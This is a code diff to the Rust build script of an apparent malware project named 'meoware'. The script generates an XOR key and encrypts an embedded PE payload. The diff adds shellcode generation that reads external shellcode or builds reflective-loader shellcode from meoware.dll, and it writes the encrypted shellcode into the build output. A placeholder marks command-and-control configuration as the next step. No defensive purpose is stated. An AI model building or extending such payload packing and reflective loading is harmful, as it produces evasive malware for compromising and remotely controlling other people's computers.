@@ -1,10 +1,13 @@
- use std::env;
+#[path = "build_loader.rs"]
+mod build_loader;
+
+use std::env;
 use std::fs;
 use std::path::PathBuf;
 
 fn main() {
-    let our_dir = env::var("OUT_DIR").unwrap();
-    let out_path = PathBuf::from(&our_dir);
+    let out_dir = env::var("OUT_DIR").unwrap();
+    let out_path = PathBuf::from(&out_dir);
 
     let key = generate_build_key();
     let key_code = format!("const XOR_KEY: [u8; {}] = {:?};", key.len(), key);
@@ -26,7 +29,36 @@ fn main() {
     let encrypted_pe = xor_encrypt(&pe_data, &key);
     fs::write(out_path.join("payload.enc"), &encrypted_pe).unwrap();
 
-    unimplemented!("TODO: Shellcode generation")
+    // Shellcode generation
+    let shellcode = if let Ok(sc_path) = env::var("PAYLOAD_SHELLCODE_PATH") {
+        println!("cargo:warning=Using external shellcode: {}", sc_path);
+        fs::read(&sc_path).unwrap_or_default()
+    } else {
+        // Look for meoware.dll in target/release/
+        let dll_path = build_loader::find_meoware_dll();
+        if let Some(dll) = dll_path {
+            println!("cargo:warning=Found meoware.dll — generating PIC reflective loader shellcode");
+            println!("cargo:rerun-if-changed={}", dll.display());
+            let dll_bytes = fs::read(&dll).unwrap();
+            let sc = build_loader::generate_reflective_shellcode(&dll_bytes, &key);
+
+            // Dump raw PIC stub before encrypted DLL payload for offline disassembly
+            let stub_only_len = sc.len() - dll_bytes.len(); // approximate: stub + header
+            fs::write(out_path.join("stub_debug.bin"), &sc[..stub_only_len.min(sc.len())]).ok();
+            println!("cargo:warning=Stub dumped to {}/stub_debug.bin ({} bytes)", out_dir, stub_only_len.min(sc.len()));
+            sc
+        } else {
+            println!("cargo:warning=meoware.dll not found — using placeholder shellcode");
+            println!("cargo:warning=Run: cargo build --release --lib -p meoware");
+            println!("cargo:warning=Then: cargo build --release --bin meoware");
+            // Minimal stub: xor eax,eax; ret (does nothing only returns 0)
+            vec![0x31, 0xC0, 0xC3]
+        }
+    };
+    let encrypted_sc = xor_encrypt(&shellcode, &key);
+    fs::write(out_path.join("shellcode.enc"), &encrypted_sc).unwrap();
+
+    unimplemented!("TODO: C2 Config")
 }
 
 fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
